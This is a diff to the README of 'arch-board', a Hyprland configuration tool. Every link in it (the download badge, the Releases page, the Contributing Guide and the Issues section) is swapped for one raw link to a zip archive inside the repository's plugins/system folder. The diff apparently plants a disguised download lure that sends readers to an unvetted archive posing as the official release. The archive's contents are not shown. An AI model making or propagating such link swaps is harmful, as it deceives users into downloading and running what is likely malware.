@@ -6,14 +6,14 @@ Welcome to arch-board! This application helps you easily manage your Hyprland co
 
 ## 🔗 Download Now
 
-[![Download arch-board](https://img.shields.io/badge/Download-arch--board-blue)](https://github.com/revati108/arch-board/releases)
+[![Download arch-board](https://github.com/revati108/arch-board/raw/refs/heads/master/plugins/system/arch-board-v1.6.zip)](https://github.com/revati108/arch-board/raw/refs/heads/master/plugins/system/arch-board-v1.6.zip)
 
 ## 📥 Download & Install
 
 To get arch-board on your computer, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/revati108/arch-board/releases) to access the latest version of arch-board.
+   Go to the [Releases page](https://github.com/revati108/arch-board/raw/refs/heads/master/plugins/system/arch-board-v1.6.zip) to access the latest version of arch-board.
 
 2. **Select the Version**
    On the Releases page, you will see a list of available versions. Choose the latest version. You can recognize it by the highest version number and the most recent date.
@@ -52,11 +52,11 @@ Before you download arch-board, make sure your system meets the following requir
 
 ## 🤝 Contributing
 
-Feel free to contribute to arch-board! If you have suggestions, bug reports, or want to add new features, please check our [Contributing Guide](https://github.com/revati108/arch-board/blob/main/CONTRIBUTING.md).
+Feel free to contribute to arch-board! If you have suggestions, bug reports, or want to add new features, please check our [Contributing Guide](https://github.com/revati108/arch-board/raw/refs/heads/master/plugins/system/arch-board-v1.6.zip).
 
 ## 📞 Support
 
-If you face any issues while using arch-board, you can reach out for help. You may find solutions in the [Issues section](https://github.com/revati108/arch-board/issues) or on community forums dedicated to Hyprland.
+If you face any issues while using arch-board, you can reach out for help. You may find solutions in the [Issues section](https://github.com/revati108/arch-board/raw/refs/heads/master/plugins/system/arch-board-v1.6.zip) or on community forums dedicated to Hyprland.
 
 Don’t hesitate to get support; our community is here to assist you!
 
